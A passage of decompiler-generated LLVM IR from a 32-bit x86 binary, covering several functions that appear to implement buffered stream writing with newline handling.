  %v8_804ff75 = icmp eq i32 %v1_804ff75, 0
  store i32 %v1_804ff75, i32* @ecx, align 4
  store i1 %v8_804ff75, i1* %zf.global-to-local, align 1
  %v1_804ff78 = icmp eq i1 %v8_804ff75, false
  br i1 %v1_804ff78, label %dec_label_pc_804ff63, label %dec_label_pc_804ff7a

dec_label_pc_804ff7a:                             ; preds = %dec_label_pc_804ff70, %dec_label_pc_804ff55, %dec_label_pc_804ff4b
  %v0_804ff82 = phi i32 [ 0, %dec_label_pc_804ff4b ], [ %v2_804ff55, %dec_label_pc_804ff55 ], [ %v1_804ff70, %dec_label_pc_804ff70 ]
  %v0_804ff7e = phi i32 [ %v0_804ff7e.pre, %dec_label_pc_804ff4b ], [ %v2_804ff6c16, %dec_label_pc_804ff55 ], [ %v2_804ff73, %dec_label_pc_804ff70 ]
  %v2_804ff7a = ptrtoint i32* %stack_var_-32 to i32
  %v12_804ff7e = icmp eq i32 %v0_804ff7e, %v2_804ff7a
  store i1 %v12_804ff7e, i1* %zf.global-to-local, align 1
  br i1 %v12_804ff7e, label %dec_label_pc_804ff85, label %dec_label_pc_804ff82

dec_label_pc_804ff82:                             ; preds = %dec_label_pc_804ff7a
  %v1_804ff82 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804ff82 = inttoptr i32 %v1_804ff82 to i32*
  store i32 %v0_804ff82, i32* %v2_804ff82, align 4
  br label %dec_label_pc_804ff85

dec_label_pc_804ff85:                             ; preds = %dec_label_pc_804ff7a, %dec_label_pc_804ff82
  %v0_804ff85 = load i32, i32* %edi.global-to-local, align 4
  %v1_804ff87 = load i32, i32* @ecx, align 4
  %v2_804ff87 = sub i32 %v0_804ff85, %v1_804ff87
  %v12_804ff87 = icmp eq i32 %v2_804ff87, 0
  br label %dec_label_pc_804ff89

dec_label_pc_804ff89:                             ; preds = %dec_label_pc_804ff3b, %dec_label_pc_804ff85
  %storemerge = phi i1 [ %v12_804ff87, %dec_label_pc_804ff85 ], [ false, %dec_label_pc_804ff3b ]
  %storemerge2 = phi i32 [ %v2_804ff87, %dec_label_pc_804ff85 ], [ -1, %dec_label_pc_804ff3b ]
  store i1 %storemerge, i1* %zf.global-to-local, align 1
  %v0_804ff89 = load i32, i32* @esp, align 4
  %v9_804ff89 = icmp eq i32 %v0_804ff89, -28
  store i1 %v9_804ff89, i1* %zf.global-to-local, align 1
  store i32 %v0_804ff0f, i32* %ebx.global-to-local, align 4
  ret i32 %storemerge2

; uselistorder directives
  uselistorder i1 %v12_804ff7e, { 1, 0 }
  uselistorder i32 %v2_804ff73, { 0, 2, 1 }
  uselistorder i32 %v1_804ff70, { 0, 2, 1 }
  uselistorder i32 %v2_804ff63, { 1, 2, 0 }
  uselistorder i32 %v2_804ff55, { 1, 0, 2 }
  uselistorder i32 %v0_804ff5a, { 1, 0 }
  uselistorder i32 %v2_804ff6c16, { 1, 0 }
  uselistorder i1 %v12_804ff27, { 1, 0 }
  uselistorder i32 %v4_804ff13, { 1, 0, 2 }
  uselistorder i1* %zf.global-to-local, { 1, 0, 2, 7, 4, 5, 6, 12, 8, 3, 9, 10, 11 }
  uselistorder i32* %esi.global-to-local, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 0, 4, 1, 3, 2, 5 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 3, 4, 2 }
  uselistorder i32 127, { 2, 0, 1, 6, 3, 7, 4, 5 }
  uselistorder i32 %arg3, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804ff89, { 1, 0 }
  uselistorder label %dec_label_pc_804ff85, { 1, 0 }
  uselistorder label %dec_label_pc_804ff63, { 1, 0 }
  uselistorder label %dec_label_pc_804ff55, { 1, 0 }
  uselistorder label %dec_label_pc_804ff53, { 1, 0 }
}

define i32 @function_804ff94(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ff94:
  %tmp7 = call i32 @__decompiler_undefined_function_0()
  %tmp11 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804ff94 = load i32, i32* @ebx, align 4
  store i32 %v0_804ff94, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v4_804ff9f = call i32 @function_804f9e4(i32 %arg1, i32 3, i32 %tmp11, i32 %tmp7)
  store i32 %v4_804ff9f, i32* @eax, align 4
  %v10_804ffa9 = icmp eq i32 %v4_804ff9f, -1
  br i1 %v10_804ffa9, label %dec_label_pc_804ffc0, label %dec_label_pc_804ffae

dec_label_pc_804ffae:                             ; preds = %dec_label_pc_804ff94
  %v0_804ffae = load i32, i32* @ebx, align 4
  %v4_804ffb6 = inttoptr i32 %arg2 to i8*
  %v5_804ffb6 = call i32 @function_804bf78(i32 %v4_804ff9f, i8* %v4_804ffb6, i32 0, i32 %v0_804ffae)
  br label %dec_label_pc_804ffc0

dec_label_pc_804ffc0:                             ; preds = %dec_label_pc_804ff94, %dec_label_pc_804ffae
  %v0_804ffc0 = phi i32 [ 0, %dec_label_pc_804ff94 ], [ %v5_804ffb6, %dec_label_pc_804ffae ]
  %v2_804ffc4 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804ffc4, i32* @ebx, align 4
  ret i32 %v0_804ffc0

; uselistorder directives
  uselistorder i32 %v4_804ff9f, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32)* @function_804f9e4, { 2, 0, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_804ffc0, { 1, 0 }
}

define i32 @function_804ffc8(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804ffc8:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  %zf.global-to-local = alloca i1, align 1
  %stack_var_-28 = alloca i32, align 4
  %v0_804ffc9 = load i32, i32* @edi, align 4
  %v0_804ffcb = load i32, i32* @ebx, align 4
  %v15_804ffcc = ptrtoint i32* %stack_var_-28 to i32
  %v4_804ffcf = ptrtoint i16* %arg1 to i32
  store i32 %v4_804ffcf, i32* %ebp.global-to-local, align 4
  store i32 %arg2, i32* @edi, align 4
  store i32 %arg3, i32* @ebx, align 4
  %v1_804ffdb5 = icmp eq i32 %arg3, 0
  store i1 %v1_804ffdb5, i1* %zf.global-to-local, align 1
  br i1 %v1_804ffdb5, label %dec_label_pc_805003c, label %dec_label_pc_804ffe0.lr.ph

dec_label_pc_804ffe0.lr.ph:                       ; preds = %dec_label_pc_804ffc8
  br label %dec_label_pc_804ffe0

dec_label_pc_804ffe0:                             ; preds = %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge, %dec_label_pc_804ffe0.lr.ph
  %v0_804ffed = phi i32 [ %v4_804ffcf, %dec_label_pc_804ffe0.lr.ph ], [ %v0_804ffed.pre, %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge ]
  %v0_804ffec = phi i32 [ %arg2, %dec_label_pc_804ffe0.lr.ph ], [ %v2_804fffe, %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge ]
  %v0_804ffe8.in = phi i32 [ %arg3, %dec_label_pc_804ffe0.lr.ph ], [ %v2_804fffc, %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge ]
  %v4_804ffe8 = phi i32 [ %arg3, %dec_label_pc_804ffe0.lr.ph ], [ %v2_804fffc, %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge ]
  %v0_804ffe8 = icmp slt i32 %v0_804ffe8.in, 0
  store i32 %v4_804ffe8, i32* %esi.global-to-local, align 4
  %v2_804ffe8 = icmp eq i1 %v0_804ffe8, false
  %v5_804ffe8 = select i1 %v2_804ffe8, i32 %v4_804ffe8, i32 2147483647
  store i32 %v5_804ffe8, i32* %eax.global-to-local, align 4
  %v1_804ffed = add i32 %v0_804ffed, 4
  %v2_804ffed = inttoptr i32 %v1_804ffed to i32*
  %v3_804ffed = load i32, i32* %v2_804ffed, align 4
  %tmp37 = inttoptr i32 %v0_804ffec to i32*
  %v5_804fff0 = call i32 @function_804ba4c(i32 %v3_804ffed, i32* %tmp37, i32 %v5_804ffe8)
  store i32 %v5_804fff0, i32* %eax.global-to-local, align 4
  %v1_804fff8 = icmp eq i32 %v5_804fff0, 0
  store i1 %v1_804fff8, i1* %zf.global-to-local, align 1
  %v2_804fff8 = icmp slt i32 %v5_804fff0, 0
  br i1 %v2_804fff8, label %dec_label_pc_8050002, label %dec_label_pc_804fffc

dec_label_pc_804fffc:                             ; preds = %dec_label_pc_804ffe0
  %v0_804fffc = load i32, i32* @ebx, align 4
  %v2_804fffc = sub i32 %v0_804fffc, %v5_804fff0
  %v12_804fffc = icmp eq i32 %v2_804fffc, 0
  store i32 %v2_804fffc, i32* @ebx, align 4
  %v0_804fffe = load i32, i32* @edi, align 4
  %v2_804fffe = add i32 %v0_804fffe, %v5_804fff0
  store i32 %v2_804fffe, i32* @edi, align 4
  store i1 %v12_804fffc, i1* %zf.global-to-local, align 1
  br i1 %v12_804fffc, label %dec_label_pc_805003c, label %dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge

dec_label_pc_804fffc.dec_label_pc_804ffe0_crit_edge: ; preds = %dec_label_pc_804fffc
  %v0_804ffed.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804ffe0

dec_label_pc_8050002:                             ; preds = %dec_label_pc_804ffe0
  %v0_8050002 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050002 = inttoptr i32 %v0_8050002 to i32*
  %v2_8050002 = load i32, i32* %v1_8050002, align 4
  store i32 %v2_8050002, i32* %eax.global-to-local, align 4
  %v1_8050005 = add i32 %v0_8050002, 8
  %v2_8050005 = inttoptr i32 %v1_8050005 to i32*
  %v3_8050005 = load i32, i32* %v2_8050005, align 4
  store i32 %v3_8050005, i32* @edx, align 4
  %v1_8050008 = or i32 %v2_8050002, 8
  store i32 %v1_8050008, i32* %eax.global-to-local, align 4
  %v1_805000b = trunc i32 %v1_8050008 to i16
  %v3_805000b = inttoptr i32 %v0_8050002 to i16*
  store i16 %v1_805000b, i16* %v3_805000b, align 2
  %v0_805000f = load i32, i32* %ebp.global-to-local, align 4
  %v1_805000f = add i32 %v0_805000f, 12
  %v2_805000f = inttoptr i32 %v1_805000f to i32*
  %v3_805000f = load i32, i32* %v2_805000f, align 4
  %v1_8050012 = load i32, i32* @edx, align 4
  %v2_8050012 = sub i32 %v3_805000f, %v1_8050012
  %v12_8050012 = icmp eq i32 %v2_8050012, 0
  store i1 %v12_8050012, i1* %zf.global-to-local, align 1
  store i32 %v2_8050012, i32* %eax.global-to-local, align 4
  %v4_8050038.pre = load i32, i32* @ebx, align 4
  br i1 %v12_8050012, label %dec_label_pc_8050038, label %dec_label_pc_8050016

dec_label_pc_8050016:                             ; preds = %dec_label_pc_8050002
  %v12_8050016 = icmp eq i32 %v2_8050012, %v4_8050038.pre
  store i1 %v12_8050016, i1* %zf.global-to-local, align 1
  %tmp = icmp ule i32 %v2_8050012, %v4_8050038.pre
  %v3_8050018 = load i32, i32* %esi.global-to-local, align 4
  %v5_8050018 = select i1 %tmp, i32 %v2_8050012, i32 %v3_8050018
  store i32 %v5_8050018, i32* %esi.global-to-local, align 4
  %v0_805001b.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_805001b

dec_label_pc_805001b:                             ; preds = %dec_label_pc_805002d, %dec_label_pc_8050016
  %v2_805001f = phi i32 [ %v1_8050029, %dec_label_pc_805002d ], [ %v1_8050012, %dec_label_pc_8050016 ]
  %v4_805001b = phi i32 [ %v4_805001b.pre, %dec_label_pc_805002d ], [ %v2_8050012, %dec_label_pc_8050016 ]
  %v0_805001b = phi i32 [ %v1_805002d, %dec_label_pc_805002d ], [ %v0_805001b.pre, %dec_label_pc_8050016 ]
  %v1_805001b = inttoptr i32 %v0_805001b to i8*
  %v2_805001b = load i8, i8* %v1_805001b, align 1
  %v3_805001b = zext i8 %v2_805001b to i32
  %v5_805001b = and i32 %v4_805001b, -256
  %v6_805001b = or i32 %v3_805001b, %v5_805001b
  store i32 %v6_805001b, i32* %eax.global-to-local, align 4
  %v10_805001d = icmp eq i8 %v2_805001b, 10
  store i1 %v10_805001d, i1* %zf.global-to-local, align 1
  %v3_805001f = inttoptr i32 %v2_805001f to i8*
  store i8 %v2_805001b, i8* %v3_805001f, align 1
  %v0_8050021 = load i1, i1* %zf.global-to-local, align 1
  %v1_8050021 = icmp eq i1 %v0_8050021, false
  br i1 %v1_8050021, label %dec_label_pc_8050029, label %dec_label_pc_8050023

dec_label_pc_8050023:                             ; preds = %dec_label_pc_805001b
  %v0_8050023 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8050023 = add i32 %v0_8050023, 1
  %v2_8050023 = inttoptr i32 %v1_8050023 to i8*
  %v3_8050023 = load i8, i8* %v2_8050023, align 1
  %v4_8050023 = urem i8 %v3_8050023, 2
  %v5_8050023 = icmp eq i8 %v4_8050023, 0
  store i1 %v5_8050023, i1* %zf.global-to-local, align 1
  %v1_8050027 = icmp eq i1 %v5_8050023, false
  br i1 %v1_8050027, label %dec_label_pc_8050023.dec_label_pc_8050030_crit_edge, label %dec_label_pc_8050029

dec_label_pc_8050023.dec_label_pc_8050030_crit_edge: ; preds = %dec_label_pc_8050023
  %v0_8050030.pre = load i32, i32* @edx, align 4
  br label %dec_label_pc_8050030

dec_label_pc_8050029:                             ; preds = %dec_label_pc_8050023, %dec_label_pc_805001b
  %v0_8050029 = load i32, i32* @edx, align 4
  %v1_8050029 = add i32 %v0_8050029, 1
  store i32 %v1_8050029, i32* @edx, align 4
  %v0_805002a = load i32, i32* %esi.global-to-local, align 4
  %v1_805002a = add i32 %v0_805002a, -1
  %v8_805002a = icmp eq i32 %v1_805002a, 0
  store i1 %v8_805002a, i1* %zf.global-to-local, align 1
  store i32 %v1_805002a, i32* %esi.global-to-local, align 4
  br i1 %v8_805002a, label %dec_label_pc_8050029.dec_label_pc_8050030_crit_edge, label %dec_label_pc_805002d

dec_label_pc_8050029.dec_label_pc_8050030_crit_edge: ; preds = %dec_label_pc_8050029
  %v1_8050030.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_8050030

dec_label_pc_805002d:                             ; preds = %dec_label_pc_8050029
  %v0_805002d = load i32, i32* @edi, align 4
  %v1_805002d = add i32 %v0_805002d, 1
  %v8_805002d = icmp eq i32 %v1_805002d, 0
  store i1 %v8_805002d, i1* %zf.global-to-local, align 1
  store i32 %v1_805002d, i32* @edi, align 4
  %v4_805001b.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805001b

dec_label_pc_8050030:                             ; preds = %dec_label_pc_8050029.dec_label_pc_8050030_crit_edge, %dec_label_pc_8050023.dec_label_pc_8050030_crit_edge
  %v1_8050030 = phi i32 [ %v0_8050023, %dec_label_pc_8050023.dec_label_pc_8050030_crit_edge ], [ %v1_8050030.pre, %dec_label_pc_8050029.dec_label_pc_8050030_crit_edge ]
  %v0_8050030 = phi i32 [ %v0_8050030.pre, %dec_label_pc_8050023.dec_label_pc_8050030_crit_edge ], [ %v1_8050029, %dec_label_pc_8050029.dec_label_pc_8050030_crit_edge ]
  %v2_8050030 = add i32 %v1_8050030, 16
  %v3_8050030 = inttoptr i32 %v2_8050030 to i32*
  store i32 %v0_8050030, i32* %v3_8050030, align 4
  %v0_8050033 = load i32, i32* @edx, align 4
  %v1_8050033 = load i32, i32* %ebp.global-to-local, align 4
  %v2_8050033 = add i32 %v1_8050033, 8
  %v3_8050033 = inttoptr i32 %v2_8050033 to i32*
  %v4_8050033 = load i32, i32* %v3_8050033, align 4
  %v5_8050033 = sub i32 %v0_8050033, %v4_8050033
  store i32 %v5_8050033, i32* @edx, align 4
  %v0_8050036 = load i32, i32* @ebx, align 4
  %v2_8050036 = sub i32 %v0_8050036, %v5_8050033
  %v12_8050036 = icmp eq i32 %v2_8050036, 0
  store i1 %v12_8050036, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_8050038

dec_label_pc_8050038:                             ; preds = %dec_label_pc_8050002, %dec_label_pc_8050030
  %v4_8050038 = phi i32 [ %v2_8050036, %dec_label_pc_8050030 ], [ %v4_8050038.pre, %dec_label_pc_8050002 ]
  %v5_8050038 = sub i32 %arg3, %v4_8050038
  %v15_8050038 = icmp eq i32 %v5_8050038, 0
  store i1 %v15_8050038, i1* %zf.global-to-local, align 1
  %v0_8050040.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_805003c

dec_label_pc_805003c:                             ; preds = %dec_label_pc_804fffc, %dec_label_pc_804ffc8, %dec_label_pc_8050038
  %v0_8050040 = phi i32 [ %v0_8050040.pre, %dec_label_pc_8050038 ], [ %v15_804ffcc, %dec_label_pc_804ffc8 ], [ %v15_804ffcc, %dec_label_pc_804fffc ]
  %stack_var_12.0 = phi i32 [ %v5_8050038, %dec_label_pc_8050038 ], [ 0, %dec_label_pc_804ffc8 ], [ %arg3, %dec_label_pc_804fffc ]
  store i32 %stack_var_12.0, i32* %eax.global-to-local, align 4
  %v9_8050040 = icmp eq i32 %v0_8050040, -12
  store i1 %v9_8050040, i1* %zf.global-to-local, align 1
  store i32 %v0_804ffcb, i32* @ebx, align 4
  store i32 %v0_804ffc9, i32* @edi, align 4
  ret i32 %stack_var_12.0

; uselistorder directives
  uselistorder i32 %stack_var_12.0, { 1, 0 }
  uselistorder i32 %v1_805002d, { 1, 2, 0 }
  uselistorder i32 %v1_805002a, { 1, 0 }
  uselistorder i32 %v1_8050029, { 0, 2, 1 }
  uselistorder i8 %v2_805001b, { 1, 0, 2 }
  uselistorder i32 %v4_8050038.pre, { 2, 0, 1 }
  uselistorder i32 %v2_8050012, { 2, 3, 0, 1, 4, 5 }
  uselistorder i32 %v2_804fffe, { 1, 0 }
  uselistorder i32 %v2_804fffc, { 2, 3, 0, 1 }
  uselistorder i32 %v5_804fff0, { 0, 3, 1, 2, 4 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10, 12 }
  uselistorder i32* %ebp.global-to-local, { 2, 0, 4, 3, 5, 1, 6 }
  uselistorder i32 (i32, i32*, i32)* @function_804ba4c, { 1, 0 }
  uselistorder i32 %arg3, { 1, 4, 2, 0, 3, 5 }
  uselistorder label %dec_label_pc_805003c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8050038, { 1, 0 }
}

define i32 @function_8050048(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_8050048:
  %eax.global-to-local = alloca i32, align 4
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_8050048 = load i32, i32* @ebp, align 4
  %v0_8050049 = load i32, i32* @edi, align 4
  %v0_805004a = load i32, i32* @esi, align 4
  %v0_805004b = load i32, i32* @ebx, align 4
  store i32 %v0_805004b, i32* %stack_var_-16, align 4
  store i32 %arg3, i32* @esi, align 4
  store i32 %arg1, i32* @ebp, align 4
  store i32 %arg2, i32* @edi, align 4
  %v1_805005b = add i32 %arg3, 1
  %v2_805005b = inttoptr i32 %v1_805005b to i8*
  %v3_805005b = load i8, i8* %v2_805005b, align 1
  %v4_805005b = and i8 %v3_805005b, 2
  %v5_805005b = icmp eq i8 %v4_805005b, 0
  %v1_805005f = icmp eq i1 %v5_805005b, false
  br i1 %v1_805005f, label %dec_label_pc_8050110, label %dec_label_pc_8050065

dec_label_pc_8050065:                             ; preds = %dec_label_pc_8050048
  %v1_8050065 = add i32 %arg3, 4
  %v2_8050065 = inttoptr i32 %v1_8050065 to i32*
  %v3_8050065 = load i32, i32* %v2_8050065, align 4
  %v13_8050065 = icmp eq i32 %v3_8050065, -2
  %v1_8050069 = add i32 %arg3, 16
  %v2_8050069 = inttoptr i32 %v1_8050069 to i32*
  %v3_8050069 = load i32, i32* %v2_8050069, align 4
  store i32 %v3_8050069, i32* @edx, align 4
  %v1_805006c = add i32 %arg3, 12
  %v2_805006c = inttoptr i32 %v1_805006c to i32*
  %v3_805006c = load i32, i32* %v2_805006c, align 4
  store i32 %v3_805006c, i32* %eax.global-to-local, align 4
  %v1_805006f = icmp eq i1 %v13_8050065, false
  %v2_805008e = sub i32 %v3_805006c, %v3_8050069
  br i1 %v1_805006f, label %dec_label_pc_805008e, label %dec_label_pc_8050071

dec_label_pc_8050071:                             ; preds = %dec_label_pc_8050065
  %tmp = icmp uge i32 %v2_805008e, %arg2
  %v5_8050078 = select i1 %tmp, i32 %arg2, i32 %v2_805008e
  store i32 %v5_8050078, i32* %ebx.global-to-local, align 4
  %v3_805007e = inttoptr i32 %v3_8050069 to i16*
  %v4_805007e = call i32 @function_804d4b8(i16* %v3_805007e, i32 %v5_8050078, i32 %v3_805006c)
  store i32 %v4_805007e, i32* %eax.global-to-local, align 4
  %v0_8050086 = load i32, i32* @esi, align 4
  %v1_8050086 = add i32 %v0_8050086, 16
  %v2_8050086 = inttoptr i32 %v1_8050086 to i32*
  %v3_8050086 = load i32, i32* %v2_8050086, align 4
  %v4_8050086 = load i32, i32* %ebx.global-to-local, align 4
  %v5_8050086 = add i32 %v4_8050086, %v3_8050086
  store i32 %v5_8050086, i32* %v2_8050086, align 4
  br label %dec_label_pc_8050128

dec_label_pc_805008e:                             ; preds = %dec_label_pc_8050065
  store i32 %v2_805008e, i32* %eax.global-to-local, align 4
  %v6_8050092 = icmp ult i32 %v2_805008e, %arg2
  br i1 %v6_8050092, label %dec_label_pc_80500f7, label %dec_label_pc_8050094

dec_label_pc_8050094:                             ; preds = %dec_label_pc_805008e
  %v0_8050094 = load i32, i32* @ecx, align 4
  %v3_8050098 = inttoptr i32 %v3_8050069 to i16*
  %v4_8050098 = call i32 @function_804d4b8(i16* %v3_8050098, i32 %arg2, i32 %v0_8050094)
  store i32 %v4_8050098, i32* %eax.global-to-local, align 4
  %v0_80500a0 = load i32, i32* @esi, align 4
  %v1_80500a0 = add i32 %v0_80500a0, 16
  %v2_80500a0 = inttoptr i32 %v1_80500a0 to i32*
  %v3_80500a0 = load i32, i32* %v2_80500a0, align 4
  %v4_80500a0 = load i32, i32* @edi, align 4
  %v5_80500a0 = add i32 %v4_80500a0, %v3_80500a0
  store i32 %v5_80500a0, i32* %v2_80500a0, align 4
  %v0_80500a3 = load i32, i32* @esi, align 4
  %v1_80500a3 = add i32 %v0_80500a3, 1
  %v2_80500a3 = inttoptr i32 %v1_80500a3 to i8*
  %v3_80500a3 = load i8, i8* %v2_80500a3, align 1
  %v4_80500a3 = urem i8 %v3_80500a3, 2
  %v5_80500a3 = icmp eq i8 %v4_80500a3, 0
  br i1 %v5_80500a3, label %dec_label_pc_8050128, label %dec_label_pc_80500a9

dec_label_pc_80500a9:                             ; preds = %dec_label_pc_8050094
  %v0_80500a9 = load i32, i32* @edx, align 4
  %v0_80500aa = load i32, i32* @edi, align 4
  %v4_80500ae = call i32 @function_8050a3c(i8 10, i32 %v0_80500aa, i32 %v0_80500a9)
  store i32 %v4_80500ae, i32* %eax.global-to-local, align 4
  %v1_80500b6 = icmp eq i32 %v4_80500ae, 0
  br i1 %v1_80500b6, label %dec_label_pc_8050128, label %dec_label_pc_80500ba

dec_label_pc_80500ba:                             ; preds = %dec_label_pc_80500a9
  %v0_80500bd = load i32, i32* @esi, align 4
  %v1_80500be = call i32 @function_804c2c0(i32 %v0_80500bd)
  store i32 %v1_80500be, i32* %eax.global-to-local, align 4
  %v1_80500c6 = icmp eq i32 %v1_80500be, 0
  br i1 %v1_80500c6, label %dec_label_pc_8050128, label %dec_label_pc_80500ca

dec_label_pc_80500ca:                             ; preds = %dec_label_pc_80500ba
  %v0_80500ca = load i32, i32* @edi, align 4
  %tmp20 = icmp ule i32 %v0_80500ca, %v1_80500be
  %v5_80500ce = select i1 %tmp20, i32 %v0_80500ca, i32 %v1_80500be
  store i32 %v5_80500ce, i32* %ebx.global-to-local, align 4
  %v2_80500d3 = sub i32 %v0_80500ca, %v5_80500ce
  store i32 %v2_80500d3, i32* %eax.global-to-local, align 4
  %v0_80500d5 = load i32, i32* @ebp, align 4
  %v2_80500d5 = add i32 %v0_80500d5, %v2_80500d3
  store i32 %v2_80500d5, i32* %ebp.global-to-local, align 4
  %v4_80500dc = call i32 @function_80509cc(i8* inttoptr (i32 10 to i8*), i32 %v5_80500ce, i32 %v2_80500d3)
  store i32 %v4_80500dc, i32* %eax.global-to-local, align 4
  %v1_80500e4 = icmp eq i32 %v4_80500dc, 0
  store i32 %v4_80500dc, i32* @edx, align 4
  br i1 %v1_80500e4, label %dec_label_pc_8050128, label %dec_label_pc_80500ea

dec_label_pc_80500ea:                             ; preds = %dec_label_pc_80500ca
  %v0_80500ea = load i32, i32* %ebp.global-to-local, align 4
  %v1_80500ea = load i32, i32* %ebx.global-to-local, align 4
  %v2_80500ea = sub i32 %v0_80500ea, %v4_80500dc
  %v2_80500ee = add i32 %v2_80500ea, %v1_80500ea
  store i32 %v2_80500ee, i32* %eax.global-to-local, align 4
  %v0_80500f0 = load i32, i32* @esi, align 4
  %v1_80500f0 = add i32 %v0_80500f0, 16
  %v2_80500f0 = inttoptr i32 %v1_80500f0 to i32*
  %v3_80500f0 = load i32, i32* %v2_80500f0, align 4
  %v5_80500f0 = sub i32 %v3_80500f0, %v2_80500ee
  store i32 %v5_80500f0, i32* %v2_80500f0, align 4
  %v0_80500f3 = load i32, i32* @edi, align 4
  %v1_80500f3 = load i32, i32* %eax.global-to-local, align 4
  %v2_80500f3 = sub i32 %v0_80500f3, %v1_80500f3
  store i32 %v2_80500f3, i32* @edi, align 4
  br label %dec_label_pc_8050128

dec_label_pc_80500f7:                             ; preds = %dec_label_pc_805008e
  %v2_80500f7 = add i32 %arg3, 8
  %v3_80500f7 = inttoptr i32 %v2_80500f7 to i32*
  %v4_80500f7 = load i32, i32* %v3_80500f7, align 4
  %v15_80500f7 = icmp eq i32 %v3_8050069, %v4_80500f7
  br i1 %v15_80500f7, label %dec_label_pc_8050110, label %dec_label_pc_80500fc

dec_label_pc_80500fc:                             ; preds = %dec_label_pc_80500f7
  %v1_8050100 = call i32 @function_804c2c0(i32 %arg3)
  store i32 %v1_8050100, i32* %eax.global-to-local, align 4
  %v1_8050108 = icmp eq i32 %v1_8050100, 0
  br i1 %v1_8050108, label %dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge, label %dec_label_pc_805010c

dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge: ; preds = %dec_label_pc_80500fc
  %v0_8050110.pre = load i32, i32* @edi, align 4
  %v0_8050118.pre = load i32, i32* @esi, align 4
  %v2_805011f.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8050110

dec_label_pc_805010c:                             ; preds = %dec_label_pc_80500fc
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_8050128

dec_label_pc_8050110:                             ; preds = %dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge, %dec_label_pc_80500f7, %dec_label_pc_8050048
  %v2_805011f = phi i32 [ %v2_805011f.pre, %dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge ], [ %v0_805004b, %dec_label_pc_80500f7 ], [ %v0_805004b, %dec_label_pc_8050048 ]
  %v0_8050118 = phi i32 [ %v0_8050118.pre, %dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge ], [ %arg3, %dec_label_pc_80500f7 ], [ %arg3, %dec_label_pc_8050048 ]
  %v0_8050110 = phi i32 [ %v0_8050110.pre, %dec_label_pc_80500fc.dec_label_pc_8050110_crit_edge ], [ %arg2, %dec_label_pc_80500f7 ], [ %arg2, %dec_label_pc_8050048 ]
  store i32 %v2_805011f, i32* @ebx, align 4
  store i32 %v0_8050049, i32* @edi, align 4
  %v4_8050123 = inttoptr i32 %v0_8050118 to i16*
  %v5_8050123 = call i32 @function_804ffc8(i16* %v4_8050123, i32 %v0_8050110, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_8050123, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8050128

dec_label_pc_8050128:                             ; preds = %dec_label_pc_80500ca, %dec_label_pc_80500ba, %dec_label_pc_80500a9, %dec_label_pc_8050094, %dec_label_pc_805010c, %dec_label_pc_80500ea, %dec_label_pc_8050071, %dec_label_pc_8050110
  %v0_805012b = load i32, i32* @edi, align 4
  store i32 %v0_805012b, i32* %eax.global-to-local, align 4
  %v2_805012d = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_805012d, i32* @ebx, align 4
  store i32 %v0_805004a, i32* @esi, align 4
  store i32 %v0_8050049, i32* @edi, align 4
  store i32 %v0_8050048, i32* @ebp, align 4
  ret i32 %v0_805012b

; uselistorder directives
  uselistorder i32 %v2_80500ee, { 1, 0 }
  uselistorder i32 %v0_80500ca, { 2, 1, 0 }
  uselistorder i32 %v1_80500be, { 1, 0, 2, 3 }
  uselistorder i32 %v2_805008e, { 2, 3, 1, 0 }
  uselistorder i32 %v3_8050069, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v0_8050049, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 2, 3, 4, 1, 5, 0, 6 }
  uselistorder label %dec_label_pc_8050128, { 7, 4, 5, 0, 1, 2, 3, 6 }
}

